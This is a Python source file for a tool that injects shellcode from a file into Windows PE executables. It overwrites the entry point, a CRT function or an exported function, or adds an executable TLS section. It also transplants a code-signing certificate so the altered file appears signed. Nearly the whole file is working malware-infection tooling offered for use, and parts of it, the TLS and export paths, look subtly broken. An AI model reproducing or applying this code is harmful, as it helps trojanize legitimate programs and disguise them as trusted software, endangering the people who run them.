import os                                                                                                    
import pefile                                                                                                
import struct                                                                                                
import shutil                                                                                                
                                                                                                             
class PEInjector:                                                                                            
    def __init__(self):                                                                                      
        pass                                                                                                 
                                                                                                             
    def backup_file(self, filepath):                                                                         
        """创建文件备份"""                                                                                   
        if not os.path.exists(filepath):                                                                     
            raise FileNotFoundError(f"文件不存在: {filepath}")                                               
        shutil.copy2(filepath, filepath + ".bak")                                                            
                                                                                                             
    def copy_cert(self, pe_path):                                                                            
        """复制PE文件的证书"""                                                                               
        try:                                                                                                 
            pe = pefile.PE(pe_path)                                                                          
            if not hasattr(pe, 'DIRECTORY_ENTRY_SECURITY'):                                                  
                return None                                                                                  
                                                                                                             
            cert_offset = pe.DIRECTORY_ENTRY_SECURITY.VirtualAddress                                         
            cert_size = pe.DIRECTORY_ENTRY_SECURITY.Size                                                     
                                                                                                             
            with open(pe_path, 'rb') as f:                                                                   
                f.seek(cert_offset)                                                                          
                return f.read(cert_size)                                                                     
        except Exception as e:                                                                               
            raise RuntimeError(f"读取证书失败: {str(e)}")                                                    
                                                                                                             
    def write_cert(self, cert_data, pe_path):                                                                
        """写入证书到PE文件"""                                                                               
        if not cert_data:                                                                                    
            return                                                                                           
                                                                                                             
        try:                                                                                                 
            pe = pefile.PE(pe_path)                                                                          
                                                                                                             
            with open(pe_path, 'r+b') as f:                                                                  
                f.seek(0, 2)                                                                                 
                cert_offset = f.tell()                                                                       
                f.write(cert_data)                                                                           
                                                                                                             
                pe.OPTIONAL_HEADER.DATA_DIRECTORY[                                                           
                    pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']                                 
                ].VirtualAddress = cert_offset                                                               
                pe.OPTIONAL_HEADER.DATA_DIRECTORY[                                                           
                    pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']                                 
                ].Size = len(cert_data)                                                                      
                                                                                                             
                pe.write(pe_path)                                                                            
        except Exception as e:                                                                               
            raise RuntimeError(f"写入证书失败: {str(e)}")                                                    
                                                                                                             
    def function_inject(self, pe_path, sc_path):                                                             
        """函数注入实现"""                                                                                   
        try:                                                                                                 
            pe = pefile.PE(pe_path)                                                                          
                                                                                                             
            with open(sc_path, 'rb') as f:                                                                   
                sc_data = f.read()                                                                           
                                                                                                             
            target_va = self._find_crt_function(pe, len(sc_data))                                            
            if not target_va:                                                                                
                raise RuntimeError("找不到合适的注入位置")                                                   
                                                                                                             
            target_offset = pe.get_offset_from_rva(target_va - pe.OPTIONAL_HEADER.ImageBase)                 
                                                                                                             
            with open(pe_path, 'r+b') as f:                                                                  
                f.seek(target_offset)                                                                        
                f.write(sc_data)                                                                             
                                                                                                             
            return True                                                                                      
        except Exception as e:                                                                               
            raise RuntimeError(f"函数注入失败: {str(e)}")                                                    
                                                                                                             
    def entrypoint_inject(self, pe_path, sc_path):                                                           
        """入口点注入实现"""                                                                                 
        try:                                                                                                 
            pe = pefile.PE(pe_path)                                                                          
            entry_point = pe.OPTIONAL_HEADER.AddressOfEntryPoint                                             
            offset = pe.get_offset_from_rva(entry_point)                                                     
                                                                                                             
            with open(sc_path, 'rb') as f:                                                                   
                sc_data = f.read()                                                                           
                                                                                                             
            with open(pe_path, 'r+b') as f:                                                                  
                f.seek(offset)                                                                               
                f.write(sc_data)                                                                             
                                                                                                             
            return True                                                                                      
        except Exception as e:                                                                               
            raise RuntimeError(f"入口点注入失败: {str(e)}")                                                  
                                                                                                             
    def tls_inject(self, pe_path, sc_path):                                                                  
        """TLS注入实现"""                                                                                    
        try:                                                                                                 
            pe = pefile.PE(pe_path)                                                                          
                                                                                                             
            with open(sc_path, 'rb') as f:                                                                   
                sc_data = f.read()                                                                           
                                                                                                             
            if hasattr(pe, 'DIRECTORY_ENTRY_TLS'):                                                           
                tls = pe.DIRECTORY_ENTRY_TLS.struct                                                          
                callbacks = tls.AddressOfCallBacks - pe.OPTIONAL_HEADER.ImageBase                            
            else:                                                                                            
                tls_dir = pe.OPTIONAL_HEADER.DATA_DIRECTORY[                                                 
                    pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_TLS']                                      
                ]                                                                                            
                                                                                                             
                new_section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)                    
                new_section.__unpack__(bytearray(new_section.sizeof()))                                      
                new_section.Name = b'.tlss'                                                                  
                new_section.Characteristics = 0xE0000020                                                     
                                                                                                             
                file_alignment = pe.OPTIONAL_HEADER.FileAlignment                                            
                section_alignment = pe.OPTIONAL_HEADER.SectionAlignment                                      
                                                                                                             
                new_section.Misc_VirtualSize = len(sc_data) + 0x100                                          
                new_section.VirtualAddress = (                                                               
                    pe.sections[-1].VirtualAddress +                                                         
                    pe.sections[-1].Misc_VirtualSize                                                         
                )                                                                                            
                new_section.VirtualAddress = (                                                               
                    (new_section.VirtualAddress + section_alignment - 1) //                                  
                    section_alignment * section_alignment                                                    
                )                                                                                            
                                                                                                             
                new_section.SizeOfRawData = len(sc_data) + 0x100                                             
                new_section.PointerToRawData = (                                                             
                    pe.sections[-1].PointerToRawData +                                                       
                    pe.sections[-1].SizeOfRawData                                                            
                )                                                                                            
                new_section.PointerToRawData = (                                                             
                    (new_section.PointerToRawData + file_alignment - 1) //                                   
                    file_alignment * file_alignment                                                          
                )                                                                                            
                                                                                                             
                pe.sections.append(new_section)                                                              
                pe.__structures__.append(new_section)                                                        
                                                                                                             
                pe.OPTIONAL_HEADER.SizeOfImage = (                                                           
                    new_section.VirtualAddress +                                                             
                    new_section.Misc_VirtualSize                                                             
                )                                                                                            
                                                                                                             
                tls_dir.VirtualAddress = new_section.VirtualAddress                                          
                tls_dir.Size = 0x48                                                                          
                                                                                                             
                pe.write(pe_path)                                                                            
                                                                                                             
            return True                                                                                      
        except Exception as e:                                                                               
            raise RuntimeError(f"TLS注入失败: {str(e)}")                                                     
                                                                                                             
    def eat_inject(self, pe_path, sc_path, func_name):                                                       
        """导出表注入实现"""                                                                                 
        try:                                                                                                 
            pe = pefile.PE(pe_path)                                                                          
                                                                                                             
            if not hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):                                                    
                raise RuntimeError("PE文件没有导出表")                                                       
                                                                                                             
            exports = [(e.name.decode() if e.name else f"ordinal_{e.ordinal}", e.address)                    
                      for e in pe.DIRECTORY_ENTRY_EXPORT.symbols]                                            
                                                                                                             
            target_func = None                                                                               
            for name, addr in exports:                                                                       
                if name == func_name:                                                                        
                    target_func = addr                                                                       
                    break                                                                                    
                                                                                                             
            if not target_func:                                                                              
                raise RuntimeError(f"找不到导出函数: {func_name}")                                           
                                                                                                             
            func_offset = pe.get_offset_from_rva(target_func - pe.OPTIONAL_HEADER.ImageBase)                 
                                                                                                             
            with open(sc_path, 'rb') as f:                                                                   
                sc_data = f.read()                                                                           
                                                                                                             
            with open(pe_path, 'r+b') as f:                                                                  
                f.seek(func_offset)                                                                          
                f.write(sc_data)                                                                             
                                                                                                             
            return True                                                                                      
        except Exception as e:                                                                               
            raise RuntimeError(f"导出表注入失败: {str(e)}")                                                  
                                                                                                             
    def _find_crt_function(self, pe, sc_size):                                                               
        """查找CRT函数位置"""                                                                                
        entry_point = pe.OPTIONAL_HEADER.AddressOfEntryPoint                                                 
                                                                                                             
        code_section = None                                                                                  
        for section in pe.sections:                                                                          
            if section.contains_rva(entry_point):                                                            
                code_section = section                                                                       
                break                                                                                        
                                                                                                             
        if not code_section:                                                                                 
            return None                                                                                      
                                                                                                             
        code_data = code_section.get_data()                                                                  
                                                                                                             
        for i in range(len(code_data)-5):                                                                    
            if code_data[i] == 0xE9:                                                                         
                jmp_offset = struct.unpack('<I', code_data[i+1:i+5])[0]                                      
                target_va = pe.OPTIONAL_HEADER.ImageBase + code_section.VirtualAddress + i + jmp_offset + 5  
                                                                                                             
                if self._check_function_space(pe, target_va, sc_size):                                       
                    return target_va                                                                         
                                                                                                             
        return None                                                                                          
                                                                                                             
    def _check_function_space(self, pe, func_va, required_size):                                             
        """检查函数是否有足够的空间"""                                                                       
        func_rva = func_va - pe.OPTIONAL_HEADER.ImageBase                                                    
        code_section = None                                                                                  
                                                                                                             
        for section in pe.sections:                                                                          
            if section.contains_rva(func_rva):                                                               
                code_section = section                                                                       
                break                                                                                        
                                                                                                             
        if not code_section:                                                                                 
            return False                                                                                     
                                                                                                             
        code_data = code_section.get_data()                                                                  
        func_offset = func_rva - code_section.VirtualAddress                                                 
                                                                                                             
        for i in range(func_offset, len(code_data)-1):                                                       
            if code_data[i] == 0xC3:                                                                         
                func_size = i - func_offset                                                                  
                return func_size >= required_size                                                            
                                                                                                             
        return False                                                                                         
                                                                                                             